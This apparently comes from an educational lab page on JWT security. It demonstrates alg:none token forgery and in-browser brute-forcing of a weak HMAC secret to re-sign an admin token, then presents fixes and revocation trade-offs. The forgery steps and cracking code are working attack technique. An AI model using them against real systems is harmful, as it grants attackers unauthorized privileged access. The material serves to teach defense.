If the server does not verify it — or trusts the alg header — it is useless.

Attack 1 — alg:none (Unsigned Token Forgery)

Change the algorithm to none, set role to admin, strip the signature. The vulnerable server reads alg from the header itself and skips verification.

Forged token:
HOW THE FORGERY WORKS

// 1. Decode original token (no verification needed — just base64)
header  = { alg: 'HS256', typ: 'JWT' }
payload = { sub: '1', username: 'alice', role: 'developer', ... }

// 2. Modify
header.alg   = 'none'
payload.role = 'admin'

// 3. Re-encode — NO signature
forgedToken = base64url(JSON.stringify(header))
            + '.'
            + base64url(JSON.stringify(payload))
            + '.'    // ← trailing dot, empty signature

// 4. Server receives token, reads header.alg === 'none', skips verification
// → accepts the token, grants admin access

Attack 2 — Weak Secret Crack + Re-sign

Try common strings against the token's HMAC signature using the browser's Web Crypto API. When the secret is found, re-sign a new token with role: admin.

Re-signed admin token (after crack):
HOW THE CRACK WORKS

// HMAC-SHA256: signature = HMAC(secret, header + '.' + payload)
// To verify: recompute HMAC with candidate secret, compare to signature

// Web Crypto API (browser-native, no libraries):
const key = await crypto.subtle.importKey(
  'raw', new TextEncoder().encode(candidateSecret),
  { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
);
const computed = await crypto.subtle.sign(
  'HMAC', key,
  new TextEncoder().encode(headerB64 + '.' + payloadB64)
);
const b64 = btoa(String.fromCharCode(...new Uint8Array(computed)))
  .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');

if (b64 === signatureB64) { /* secret found! */ }

The Fix

// ✅ Whitelist the algorithm — never read it from the token header
const payload = jwt.verify(token, JWT_SECRET, {
  algorithms: ['HS256']  // ← explicit list; 'none' is never in it
});

// ✅ Use a strong secret — 256+ bits of randomness
const JWT_SECRET = require('crypto').randomBytes(64).toString('hex');
// Store in environment variable, not hardcoded

// ✅ Do NOT use jwt.decode() for auth — it skips verification entirely
// jwt.decode() is only for reading a token you've already verified

Both servers now have a Logout button. Try this sequence to see the revocation mechanism — and its limits.

2. Go to :3034 — click "Sign Out" → token is blacklisted
3. Try to use the old token in the API test below → 401 "Token has been revoked"
4. Now restart the :3034 server (Ctrl+C, npm run vulnerable)
5. Try the same old token again → it works — the denylist was in memory, now gone
(paste the old token in Step 0 first)
WHY THIS IS HARDER THAN IT LOOKS

Stateless JWT (no logout):
  Client ──login──▶ Server issues token
  Client ──request with token──▶ Server verifies signature → ✓ done
  Client ──logout──▶ Server clears local storage → token still valid elsewhere

Denylist approach (what we added):
  POST /api/logout → server adds jti to denylist Set
  Every request: server checks denylist after signature verification
  Problem: Set lives in memory → lost on restart
           Multiple server instances each have their own Set → inconsistent
  Fix: use Redis (shared, persistent) → but now JWT is stateful

Short-lived tokens + refresh tokens (production approach):
  access token: 15 min exp — short enough that "logout" matters less
  refresh token: 7 days, stored in HttpOnly cookie, can be revoked in DB
  On logout: revoke the refresh token → new access tokens cannot be issued
  Old access tokens expire on their own within 15 minutes

TL;DR: stateless JWTs cannot be truly revoked without server state.
       If you need instant revocation, you need either very short exp
       or a shared denylist (Redis). At that point, traditional
       session cookies might be simpler.
